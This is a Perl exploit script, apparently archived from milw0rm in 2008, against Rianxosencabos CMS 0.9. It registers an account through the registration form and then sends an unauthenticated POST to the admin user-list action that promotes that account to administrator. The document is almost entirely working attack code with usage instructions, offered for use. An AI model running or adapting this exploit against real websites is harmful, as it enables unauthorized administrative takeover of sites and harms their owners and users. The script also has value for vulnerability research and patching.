<html><head><title>Rianxosencabos CMS 0.9 Remote Add Admin Exploit</title></head><pre>#!/usr/bin/perl -w

# Rianxosencabos CMS 0.9 Remote Add Admin Exploit
# Download: http://downloads.sourceforge.net/rsccms/rsccms.tar.gz

# written by ka0x &lt;ka0x01 [at] gmail [dot] com&gt;
# D.O.M Labs - Security Researchers
# - www.domlabs.org -

use LWP::UserAgent;

my ($host, $login, $pass, $mail, $user_id) = @ARGV ;

unless($ARGV[4]){
	print &quot;[*] usage: perl $0 &lt;host&gt; &lt;login&gt; &lt;pass&gt; &lt;mail&gt; &lt;user_id&gt;\n&quot;;
	print &quot;[*] ex: perl $0 http://localhost/ ka0x 12345 ka0x01[at]gmail.com 2\n&quot;;
	exit 1;
}

if ($host !~ /^http:/){ $host = 'http://'.$host; }

my $ua = LWP::UserAgent-&gt;new() or die ;
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;) ;
$ua-&gt;timeout(10) ;

sub __CREATE {

	my $req = HTTP::Request-&gt;new(POST =&gt; $host.&quot;index.php?s=usuarios&amp;accion=registrar&quot;) ;
	$req-&gt;content_type('application/x-www-form-urlencoded') ;
	$req-&gt;content(&quot;reg_login=&quot;.$login.&quot;&amp;reg_pass=&quot;.$pass.&quot;&amp;reg_repass=&quot;.$pass.&quot;&amp;reg_nombre=&quot;.$login.&quot;&amp;reg_mail=&quot;.$mail.&quot;&amp;submit_register=Rexistrar&quot;) ;

	my $res = $ua-&gt;request($req) ;
	my $location = $res-&gt;header('Location') ;
	if ($location =~ /Usuario creado/i) {
		print &quot;[+] user added: &quot;.$login ;
		print &quot;\n[+] password: &quot;.$pass, &quot;\n&quot; ;
	}

	else{
		print &quot;[-] Exploit Failed!\n&quot; ;
	}
}

&amp;__CREATE ;

sub __ADMIN {
	my $req = HTTP::Request-&gt;new(POST =&gt; $host.&quot;?s=admin&amp;accion=lista&quot;) ;

	$req-&gt;content_type('application/x-www-form-urlencoded') ;

	$req-&gt;content($user_id.&quot;=0&amp;inputOculto=&quot;.$user_id) ;

	$ua-&gt;request($req) ;
}

&amp;__ADMIN ;


__END__

# milw0rm.com [2008-09-24]</pre></html>